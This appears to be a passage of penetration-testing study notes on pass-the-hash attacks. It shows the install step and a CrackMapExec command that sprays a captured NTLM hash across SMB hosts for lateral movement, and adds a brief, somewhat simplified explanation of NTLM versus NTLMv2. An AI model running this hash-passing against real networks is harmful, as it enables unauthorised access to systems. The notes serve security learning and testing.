To perform this we need **the second half** of the hash that we have discovered.

### Installing crackmapexec
```sh
sudo apt install crackmapexec
```

To perform this we need to get start crackmapexec and run the following command

```sh
crackmapexec smb <ip_address> -u "<user_name>" -H <hash> --local-auth
```

This will pass the hash around the network, if there is a green plus sign means that it has worked. This can also provide false positives.

Note: NTLMv2 cannot be passed around while NTLM can be passed around.


### NTLM vs NTLMv2
NTLM are local hashes when we dump a SAM from local administrators while NTLMv2 are used on domains.